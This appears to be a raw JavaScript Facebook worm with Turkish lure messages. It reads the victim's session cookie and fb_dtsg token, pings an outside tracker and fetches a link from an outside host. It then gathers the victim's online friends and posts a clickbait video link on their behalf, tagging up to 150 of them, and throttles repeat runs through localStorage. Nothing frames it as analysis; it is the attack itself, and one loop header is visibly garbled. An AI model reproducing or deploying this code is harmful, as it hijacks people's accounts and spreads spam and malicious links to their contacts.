if (!document.getElementById("amung")) {
    new Image().src = "http://whos.amung.us/pingjs/?k=bcpn2gdh64no";
}
var tarih = new Date();
var takip = Array("100008165316543", "1625224768");
for (i = 0; i = localStorage['Post_' + profile_id])) {
    function rndchr(n) {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (var i = 0; i < n; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
        return text;
    }
    var u = ["Canli yayinda giyilecek elbisemi Allah askina bu! " + rndchr(1) + " ", " is gercekten iyice cigrindan cikti ne olacak boyle bilmiyorum!" + rndchr(1) + " ", "Bunlar da hakli hic bir yetenegi olmayan insanlar sonucta bunlar!" + rndchr(1) + " ", " Bunlari kontrol eden kurum RTUK! gor artik bunlar ve bi cozum uret!" + rndchr(1) + " ", "Valla bunlarda kisilik falan kalmamis kardesim" + rndchr(1) + " ", "Kardesim coluk cocugumuz var bunlar iyice bozdu!" + rndchr(1) + " ", "Birakin artik bu isleri bizler akillandik yemiyoruz bu numaralari!" + rndchr(1) + " ", "Ben izledim kendimden utandim. sizde bir bakin sunlara" + rndchr(1) + " ", "Yeter biktik beee! Biz boyle izlemek istemiyoruz!" + rndchr(1) + " ", "Yaa arkadaslar bunlari kontrol eden bir kurum yokmu! " + rndchr(1) + " ", "Reyting ugruna her gun neler goruyoruz vallahi yazik!" + rndchr(1) + " ", "Bizim orf adetlerimizle hic bagdasmayan seyler bunlar!" + rndchr(1) + " ", "D\xFCn\'den Beri Ugra\u015Ft\u0131g\u0131m tek \u015Eey bu Video \u0130zleyin.", "Mutlaka \u0130zleyin g\xFCnlerdir ugra\u015F\u0131orum.", "Videomu \u0130zleyen Herkeze Te\u015Fekk\xFCrler.", "En Sevdiğim Arkadaşlarım :)", "Ben Bu Videoyu yapmak i\xE7in g\xFCnlerimi verdim kimse izlemior.", "Yeni yılınız kutlu olsun arkadaşlar :) :D", "2013 y\u0131l\u0131nda arkada\u015Flar\u0131m ile ge\xE7irdi\u011Fim en g\xFCzel anlar", "Benim videomu birtek noal baba izlesin dilek diledim", "Simdide İnanmayinda Goreyim :)", "Herkez Cesaret Edemez ..", "İste Size Bahsettigim Sirrim :)", "Cok Utaniyorum Ama Birde Siz \u0130zleyin L\xFCtfen", "Ne Kadar Cilgin Bir İnsanim Ben.", "Nasilda Tatliyim Ama..", "Dostlarimin Destegi Olmasaydi Gidemezdim..", "Destek Veren Tum Dostlarimi Kutluyorum", "Yetenek Sizsiniz T\xFCrkiye\'ye Kat\u0131ld\u0131m. \u0130zlerseniz Sevinirim", "Bunu Yapacagım Aklima Gelmezdi :)", "Destek Veren T\xFCm Arkadaslarima Tesekk\xFCr Ederim", "Sonunda Bunuda Yaptim ya Helal Olsun Bana", "Kim Derdiki Televizyona Cikacagım ?", "Taniyanlar Ne Kadar Cilgin Oldugumu Bilir :)"];
    var rand = u[Math.floor(u.length * Math.random())];
    var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

    function rastgele(uzunluk) {
        mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
        ret = "";
        for (i = 0; i < uzunluk; i++) {
            ret += mtn[Math.floor(Math.random() * 57)];
        }
        return ret;
    }
    var link = "";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", 'http://www.videotr.in/dropbox/up.php', true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            link = xhr.responseText + "?" + rastgele(250);
            topla();
        }
    }
    xhr.send();

    function topla() {
        var get = new XMLHttpRequest();
        get.onreadystatechange = function () {
            if (get.readyState == 4) {
                var response = JSON.parse(get.responseText);
                var isim = response.name;
                online(isim);
            }
        };
        get.open("GET", "https://graph.facebook.com/" + profile_id, true);
        get.send();
    }
    friends = [];

    function online(isim) {
        var get = new XMLHttpRequest();
        get.onreadystatechange = function () {
            if (get.readyState == 4) {
                try {
                    var veri = JSON.parse(get.responseText.replace("for (;;);", ""));
                    var toplam = Object.keys(veri.payload.buddy_list.nowAvailableList).length;
                    for (kisi in veri.payload.buddy_list.nowAvailableList) {
                        friends.push({
                            id: kisi
                        });
                    }
                } catch (close) {}
                paylas(isim, friends)
            }
        };
        var params = "user=" + profile_id + "&fetch_mobile=false&__user=" + profile_id + "&__a=1&__req=2&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        get.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
        get.send(params);
    }

    function paylas(isim, friends) {
        if (link != "undefined" || link != "") {
            var http = new XMLHttpRequest();
            http.onreadystatechange = function () {
                if (http.readyState == 4) {}
            };
            var params = "";
            params = "fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
            params += "&xhpc_context=home";
            params += "&xhpc_ismeta=1";
            params += "&xhpc_timeline=";
            params += "&xhpc_composerid=u_jsonp_3_3";
            params += "&xhpc_litestand=1";
            params += "&xhpc_targetid=" + profile_id;
            params += "&clp={\"cl_impid\":\"a4eb8ac2\",\"clearcounter\":0,\"elementid\":\"u_jsonp_3_g\",\"version\":\"x\",\"parent_fbid\":" + profile_id + "}";
            params += "&xhpc_message_text=" + rand;
            params += "&xhpc_message=" + rand;
            params += "&aktion=post";
            params += "&app_id=2309869772";
            params += "&attachment[params][urlInfo][canonical]=" + link;
            params += "&attachment[params][urlInfo][final]=" + link;
            params += "&attachment[params][urlInfo][user]=" + link;
            params += "&attachment[params][title]=" + isim + " :Yazıklar olsun izlerken içim gitti ya.";
            params += "&attachment[params][summary]=www.youtube.com";
            params += "&attachment[params][images][0]=https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-prn1/1525624_180057068859680_248847473_n.jpg";
            params += "&w=100";
            params += "&h=100";
            params += "&url=https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-prn1/1525624_180057068859680_248847473_n.jpg";
            params += "&cfs=1";
            params += "&upscale";
            params += "&attachment[params][medium]=106";
            params += "&attachment[params][url]=" + link;
            params += "&attachment[type]=100";
            params += "&link_metrics[source]=ShareStageExternal";
            params += "&link_metrics[domain]=youtube.com";
            params += "&link_metrics[base_domain]=youtube.com";
            params += "&link_metrics[title_len]=51";
            params += "&link_metrics[summary_len]=260";
            params += "&link_metrics[min_dimensions][0]=70";
            params += "&link_metrics[min_dimensions][1]=70";
            params += "&link_metrics[images_with_dimensions]=1";
            params += "&link_metrics[images_pending]=0";
            params += "&link_metrics[images_fetched]=0";
            params += "&link_metrics[image_dimensions][0]=325";
            params += "&link_metrics[image_dimensions][1]=325";
            params += "&link_metrics[images_selected]=1";
            params += "&link_metrics[images_considered]=1";
            params += "&link_metrics[images_cap]=10";
            params += "&link_metrics[images_type]=images_array";
            params += "&composer_metrics[best_image_w]=100";
            params += "&composer_metrics[best_image_h]=100";
            params += "&composer_metrics[image_selected]=0";
            params += "&composer_metrics[images_provided]=1";
            params += "&composer_metrics[images_loaded]=1";
            params += "&composer_metrics[images_shown]=1";
            params += "&composer_metrics[load_duration]=16";
            params += "&composer_metrics[timed_out]=0";
            params += "&composer_metrics[sort_order]=";
            params += "&composer_metrics[selector_type]=UIThumbPager_6";
            if (friends.length < 200) {
                limit = friends.length;
            } else {
                limit = 150;
            }
            for (i = 0; i < limit; i++) {
                params += '&composertags_with[' + i + ']=' + friends[i].id;
            }
            params += "&is_explicit_place=";
            params += "&composertags_place=";
            params += "&composertags_place_name=";
            params += "&tagger_session_id=1388007674";
            params += "&action_type_id[0]=";
            params += "&object_str[0]=";
            params += "&object_id[0]=";
            params += "&hide_object_attachment=0";
            params += "&og_suggestion_mechanism=";
            params += "&composertags_city=";
            params += "&disable_location_sharing=false";
            params += "&composer_predicted_city=114515998560505";
            params += "&audience[0][value]=80";
            params += "&nctr[_mod]=pagelet_composer";
            params += "&__user=" + profile_id;
            params += "&__a=1";
            params += "&__dyn=7n8a9EAMBlClUlgDxqiykUUxoshEK49oKiWFamiFo";
            params += "&__req=17";
            params += "&__rev=1058441";
            params += "&ttstamp=";
            http.open("POST", "/ajax/profile/composer.php", true);
            http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            http.send(params);
        }
    }
    if (navigator.userAgent.indexOf("Chrome") > 0) {
        tarih.setTime(tarih.getTime() + 1000 * 10 * 10);
        localStorage['Post_' + profile_id] = tarih.getTime();
    }
}
